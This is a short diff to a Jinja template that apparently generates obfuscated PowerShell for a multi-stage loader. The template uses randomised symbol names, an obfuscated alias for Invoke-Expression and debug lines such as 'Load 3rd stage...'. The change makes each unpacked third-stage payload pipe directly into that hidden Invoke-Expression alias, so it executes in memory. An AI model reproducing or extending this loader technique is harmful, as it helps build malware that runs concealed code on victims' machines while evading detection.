@@ -54,6 +54,6 @@ s`Al {{symbol_name("InvokeExpressionAlias")}} {{obfuscate("Invoke-Expression")}}
 
 {%- for code in stage3 -%}
 {{'Write-Debug "Load 3rd stage..."'|debug}}
-{{symbol_name("Unpack")}} "{{code}}";
+{{symbol_name("Unpack")}} "{{code}}" | {{symbol_name("InvokeExpressionAlias")}};
 {{separator}}
 {%- endfor -%}
